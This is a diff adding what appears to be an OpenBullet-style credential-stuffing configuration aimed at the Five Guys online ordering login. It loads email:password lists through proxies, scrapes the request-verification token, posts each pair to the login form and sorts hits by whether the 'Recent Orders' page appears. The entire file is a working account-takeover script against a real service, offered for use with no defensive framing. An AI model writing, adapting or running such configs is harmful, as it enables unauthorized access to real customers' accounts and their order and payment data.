@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "FiveGuys",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-20T00:17:40.2909715+00:00",
+  "AdditionalInfo": "",
+  "Author": "Banana Frog <3",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_REQUEST_for_reqval_token REQUEST GET "https://order.fiveguys.com/user/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_ReqvalToken PARSE "<SOURCE>" LR "<input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"" "\" /><input " Recursive=FALSE -> VAR "REQUESTVERIFICATIONTOKEN" "" "" 
+#POST_REQUEST_LOGIN REQUEST POST "https://order.fiveguys.com/user/login" AutoRedirect=TRUE 
+  CONTENT "Email=<USER>&Password=<PASS>&__RequestVerificationToken=<REQUESTVERIFICATIONTOKEN>&Url=&BasketGuid=&BasketGuidHash=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "<h1>Recent Orders</h1>" 
